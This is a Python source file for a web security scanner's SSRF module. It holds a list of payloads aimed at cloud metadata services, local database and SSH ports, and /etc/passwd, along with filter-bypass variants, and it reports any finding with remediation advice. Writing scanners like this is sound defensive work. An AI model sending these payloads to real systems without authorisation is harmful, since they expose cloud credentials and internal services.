# base/scanners/web/ssrf_scanner.py
import asyncio
import aiohttp
import socket
from typing import Dict, List
from urllib.parse import urlparse, urlencode, parse_qs

from ..base import BaseScanner, Vulnerability

class SSRFScanner(BaseScanner):
    """Server-Side Request Forgery (SSRF) vulnerability scanner"""
    
    def __init__(self, target: str, config: Dict = None):
        super().__init__(target, config)
        
        # SSRF test endpoints
        self.ssrf_endpoints = [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://localhost:22',
            'http://localhost:80',
            'http://localhost:443',
            'http://localhost:3306',
            'http://localhost:5432',
            'http://127.0.0.1:22',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443',
            'http://[::1]:22',
            'http://[::1]:80',
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'gopher://localhost:8080',
            'dict://localhost:11211',
            'ftp://localhost:21'
        ]
        
        # SSRF bypass techniques
        self.bypass_techniques = [
            lambda u: u.replace('localhost', '127.0.0.1'),
            lambda u: u.replace('localhost', '127.0.0.0'),
            lambda u: u.replace('localhost', '0.0.0.0'),
            lambda u: u.replace('localhost', 'localtest.me'),
            lambda u: u.replace('localhost', 'localhost.nip.io'),
            lambda u: u.replace('http://', 'http://127.0.0.1:80@'),
            lambda u: u.replace('http://', 'http://0.0.0.0:80@'),
            lambda u: u.replace('169.254.169.254', '169.254.169.254.nip.io'),
        ]
    
    async def scan(self) -> 'ScanResult':
        """Scan for SSRF vulnerabilities"""
        
        # Find all parameters that might accept URLs
        params = await self._find_url_parameters()
        
        # Test each parameter
        for param_info in params:
            await self._test_parameter_ssrf(param_info)
        
        return self.result
    
    async def _find_url_parameters(self) -> List[Dict]:
        """Find parameters that might accept URLs"""
        params = []
        
        # URL parameters that often accept URLs
        url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'return', 
                     'returnTo', 'return_to', 'next', 'target', 'redir',
                     'redirect_uri', 'redirect_url', 'callback', 'return_url',
                     'image_url', 'img_url', 'load_file', 'file', 'document']
        
        # Check URL parameters
        parsed = urlparse(self.target)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for param_name in query_params.keys():
                if any(up in param_name.lower() for up in url_params):
                    params.append({
                        'type': 'url',
                        'name': param_name,
                        'url': self.target,
                        'original_value': query_params[param_name][0]
                    })
        
        # Check forms
        for form in self.result.forms:
            for input_field in form.get('inputs', []):
                input_name = input_field.get('name', '').lower()
                if any(up in input_name for up in url_params):
                    params.append({
                        'type': 'form',
                        'name': input_field['name'],
                        'form': form,
                        'original_value': ''
                    })
        
        return params
    
    async def _test_parameter_ssrf(self, param_info: Dict):
        """Test a parameter for SSRF vulnerability"""
        
        for endpoint in self.ssrf_endpoints:
            # Try original endpoint
            result = await self._send_payload(param_info, endpoint)
            if result and await self._check_ssrf_success(result, endpoint):
                await self._report_ssrf(param_info, endpoint)
                return
            
            # Try bypass techniques
            for bypass in self.bypass_techniques:
                try:
                    bypassed = bypass(endpoint)
                    if bypassed != endpoint:
                        result = await self._send_payload(param_info, bypassed)
                        if result and await self._check_ssrf_success(result, bypassed):
                            await self._report_ssrf(param_info, bypassed, bypass=True)
                            return
                except:
                    continue
    
    async def _send_payload(self, param_info: Dict, payload: str) -> str:
        """Send SSRF payload to parameter"""
        try:
            async with aiohttp.ClientSession() as session:
                if param_info['type'] == 'url':
                    # Modify URL parameter
                    parsed = urlparse(param_info['url'])
                    params = parse_qs(parsed.query)
                    params[param_info['name']] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    
                    async with session.get(test_url, ssl=False, timeout=5) as response:
                        return await response.text()
                
                elif param_info['type'] == 'form':
                    # Submit form with payload
                    form = param_info['form']
                    action = form.get('action', '')
                    if not action.startswith('http'):
                        action = self.target.rstrip('/') + '/' + action.lstrip('/')
                    
                    data = {}
                    for input_field in form.get('inputs', []):
                        if input_field['name'] == param_info['name']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = 'test'
                    
                    method = form.get('method', 'post').lower()
                    if method == 'post':
                        async with session.post(action, data=data, ssl=False, timeout=5) as response:
                            return await response.text()
                    else:
                        async with session.get(action, params=data, ssl=False, timeout=5) as response:
                            return await response.text()
                            
        except asyncio.TimeoutError:
            # Timeout might indicate successful connection to internal service
            return "TIMEOUT"
        except Exception as e:
            self.logger.debug(f"SSRF payload failed: {str(e)}")
        
        return ''
    
    async def _check_ssrf_success(self, response: str, payload: str) -> bool:
        """Check if SSRF was successful"""
        
        # Check for AWS metadata
        if 'instance-id' in response and 'ami-id' in response:
            return True
        
        # Check for Google Cloud metadata
        if 'instance' in response and 'project' in response:
            return True
        
        # Check for file contents
        if 'root:' in response and 'daemon:' in response:
            return True
        
        if '[fonts]' in response or '[extensions]' in response:
            return True
        
        # Timeout might indicate successful connection to non-web service
        if response == "TIMEOUT" and any(p in payload for p in ['22', '3306', '5432']):
            return True
        
        return False
    
    async def _report_ssrf(self, param_info: Dict, payload: str, bypass: bool = False):
        """Report SSRF vulnerability"""
        
        vuln = Vulnerability(
            name="Server-Side Request Forgery (SSRF)",
            description="Application is vulnerable to SSRF attacks",
            severity="high" if 'metadata' in payload else "medium",
            cvss_score=8.5 if 'metadata' in payload else 7.0,
            cwe_id="CWE-918",
            affected_component="URL Request Handler",
            remediation="Implement URL whitelisting, validate and sanitize input, use allowlists",
            evidence=f"Parameter: {param_info['name']}\nPayload: {payload}\nBypass: {bypass}",
            proof_of_concept=f"Access: {self.target}?{param_info['name']}={payload}",
            references=[
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://cwe.mitre.org/data/definitions/918.html"
            ],
            tags=['ssrf', 'server-side']
        )
        
        self.add_vulnerability(vuln)